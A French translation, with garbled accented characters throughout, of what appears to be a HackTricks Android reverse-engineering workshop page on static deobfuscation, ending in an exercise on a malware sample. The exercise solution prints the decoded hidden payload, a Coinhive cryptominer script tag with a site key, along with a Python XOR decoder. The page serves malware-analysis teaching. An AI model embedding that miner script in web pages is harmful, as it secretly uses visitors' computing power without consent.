Il y a souvent des cas o√π l'application que vous inversez ne sera pas aussi simple que certains des exemples que nous avons discut√©s. Le d√©veloppeur impl√©mentera une ou plusieurs techniques d'obscurcissement pour masquer le comportement et/ou la mise en ≈ìuvre de leur application. Cela peut √™tre pour des raisons √† la fois b√©nignes et malveillantes.

La cl√© de l'obscurcissement √† retenir est que si vous voulez le d√©-obfusquer, vous pourrez le faire. La d√©cision cl√© n'est pas de savoir si vous le pouvez ou non, mais si cela vaut la peine de d√©-obfusquer les ressources.

La raison pour laquelle vous pouvez toujours d√©-obfusquer quelque chose est que, finalement, le processeur doit voir le code non obscurci √† un moment donn√© pour l'ex√©cuter.

## Comment d√©-obfusquer <a href="how-to-de-obfuscate" id="how-to-de-obfuscate"></a>

La fa√ßon dont vous choisissez de d√©-obfusquer l'application d√©pendra de la m√©thode d'obscurcissement, mais il existe quelques techniques courantes qui fonctionnent g√©n√©ralement bien. Ici, nous ne toucherons qu'aux techniques de d√©-obfuscation statique car cet atelier ne couvre que l'analyse/reversement statique. Cependant, n'oubliez pas que l'ex√©cution de l'application et son analyse dynamique peuvent √™tre un autre excellent moyen de contourner l'obscurcissement.

Pour l'obscurcissement dans le bytecode DEX (Java), l'un des moyens les plus simples de d√©-obfusquer de mani√®re statique est d'identifier les m√©thodes de d√©-obfuscation dans l'application et de copier leur d√©compilation dans un fichier Java que vous ex√©cutez ensuite sur le fichier obscurci, les cha√Ænes, le code, etc.

Une autre solution pour Java et le code natif consiste √† translitt√©rer l'algorithme de d√©-obfuscation en Python ou dans tout autre langage de script avec lequel vous √™tes le plus √† l'aise. Je dis "translitt√©rer" car il est important de se rappeler que vous n'avez pas toujours besoin de \*comprendre\* l'algorithme de d√©-obfuscation, vous avez juste besoin d'un moyen de l'ex√©cuter. Je couvre cela en d√©tail dans la pr√©sentation "Unpacking the Packed Unpacker" qui est li√©e dans la section "More Examples".

## Indicateurs d'obscurcissement <a href="indicators-of-obfuscation" id="indicators-of-obfuscation"></a>

Il existe de nombreux types d'obscurcissement et donc, tout autant de types d'indicateurs pour vous alerter en tant qu'analyste qu'une application est probablement obscurcie, mais voici quelques exemples avec des solutions d'analyse statique propos√©es pour la d√©-obfuscation.

* Pas de cha√Ænes : Java et Android d√©pendent fortement des cha√Ænes, donc si vous n'en voyez pas ou seulement des cha√Ænes brouill√©es, il est tr√®s probable que les cha√Ænes soient obscurcies.
  * Solution sugg√©r√©e : Recherchez les appels de m√©thode qui prennent des cha√Ænes en argument et remontez la trace de l'endroit o√π cet argument provient. √Ä un moment donn√©, l'argument de cha√Æne passera par une m√©thode de d√©-obfuscation avant d'√™tre transmis √† l'API qui prend l'argument String.
* Cha√Ænes brouill√©es : Les API Java et Android n√©cessitent des cha√Ænes de texte brut, pas brouill√©es.
  * Solution sugg√©r√©e : Les cha√Ænes brouill√©es sont toutes susceptibles d'√™tre pass√©es aux m√™mes m√©thodes avant d'√™tre pass√©es aux API. Ces m√©thodes sont probablement les m√©thodes de d√©-obfuscation.
* Fichiers binaires dans le r√©pertoire assets/ et appels DexClassLoader dans l'application : D√©ballage et chargement de code suppl√©mentaire probable. (Pourrait √©galement √™tre t√©l√©charg√© √† partir d'un emplacement distant, puis charg√© √† l'aide de DexClassLoader)
  * Solution sugg√©r√©e : Identifiez o√π le fichier est lu, puis suivez le chemin. Il est probablement d√©-obfusqu√© rapidement apr√®s avoir √©t√© lu.
* Biblioth√®ques natives - Impossible d'identifier les fonctions JNI (pas de fonctions nomm√©es Java\_ et pas d'appels √† RegisterNatives) : Pour ex√©cuter des m√©thodes natives, JNI doit √™tre capable d'apparier la fonction dans la biblioth√®que native avec la d√©claration de m√©thode native en Java et donc l'un des deux doit exister √† un moment donn√©.
  * Solution sugg√©r√©e : Commencez par la m√©thode JNI_OnLoad et recherchez une routine de d√©-obfuscation qui charge du code suppl√©mentaire.

## Exercice 7 - D√©-obfuscation de cha√Ænes <a href="exercise-7---string-deobfuscation" id="exercise-7---string-deobfuscation"></a>

Dans cet exercice, nous allons pratiquer la d√©-obfuscation de cha√Ænes afin d'analyser une application. Pour l'exercice, nous utiliserons l'√©chantillon √† `~/samples/ClashOfLights.apk` dans la VM. Cet √©chantillon a la somme de contr√¥le SHA256 c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.

### Objectifs <a href="goals" id="goals"></a>

Identifier les cha√Ænes obscurcies et d√©velopper une solution pour les d√©-obfusquer.

### Contexte de l'exercice <a href="exercise-context" id="exercise-context"></a>

Vous √™tes un analyste de logiciels malveillants examinant cette application pour d√©terminer si elle est malveillante. Vous rencontrez une cha√Æne Javascript obscurcie qui est charg√©e et devez la d√©-obfusquer pour d√©terminer si l'application est malveillante ou non. Vous ne pouvez pas ex√©cuter l'application de mani√®re dynamique et devez d√©terminer ce que fait le Javascript de mani√®re statique.

### Instructions <a href="instructions" id="instructions"></a>

1. Trouvez la cha√Æne que vous devez d√©-obfusquer
2. Identifiez la routine qui la d√©-obfusque.
3. D√©terminez comment vous voulez √©crire une solution pour d√©-obfusquer la cha√Æne.
4. Faites-le :)

### Solution <a href="solution" id="solution"></a>

La cha√Æne d√©-obfusqu√©e est :
```
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
Le script Python que j'ai √©crit pour le d√©-obfusquer est :
```
enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

length = len(enc_str)
count = 0
dec_str = [0] * (length/2)
while (count < length):
    dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
    count += 2
print dec_str


key = [75, 67, 81, 82, 49, 57, 84, 90]
enc_str = dec_str
count = 0
length = len(enc_str)
while (count < length):
    dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
    count += 1
print ''.join(dec_str)
```
## Plus d'exemples <a href="more-examples" id="more-examples"></a>

J'ai donn√© plusieurs conf√©rences sur la d√©sobfuscation des applications Android qui incluent une vari√©t√© de m√©canismes d'obfuscation. Dans ces conf√©rences, je discute des techniques d'obfuscation avanc√©es, de ma solution pour les d√©sobfusquer, ainsi que des consid√©rations et choix que j'ai faits en d√©cidant comment je voulais d√©sobfusquer.

* BlackHat USA 2018 : "Unpacking the Packed Unpacker: Reverse Engineering an Android Anti-Analysis Library" \[[vid√©o](https://www.youtube.com/watch?v=s0Tqi7fuOSU)]
  * Cette conf√©rence traite de l'ing√©nierie inverse d'une des biblioth√®ques natives anti-analyse les plus complexes que j'ai vues utilis√©es par une application Android. Elle couvre principalement les techniques d'obfuscation dans le code natif.
* REcon 2019 : "The Path to the Payload: Android Edition" \[[vid√©o](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)]
  * Cette conf√©rence aborde une s√©rie de techniques d'obfuscation, uniquement dans le code Java, qu'un botnet Android utilisait pour masquer son comportement.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
